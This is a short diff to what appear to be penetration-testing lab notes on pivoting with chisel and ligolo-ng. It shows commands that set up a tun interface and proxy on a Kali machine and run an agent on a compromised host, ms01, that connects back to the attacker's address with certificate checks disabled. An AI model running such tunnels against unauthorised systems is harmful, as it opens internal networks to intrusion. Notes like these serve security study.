@@ -110,6 +110,7 @@ Using chisel to do one reverse port forwarding, doesn't have to use proxychains4
 kali: sudo ip tuntap add user kali mode tun ligolo
 kali: sudo ip link set ligolo up
 kali: ./proxy -selfcert
+First Agent:
 ms01: agent.exe -connect kali_ip:11601 -ignore-cert
 kali: session
 kali: 1
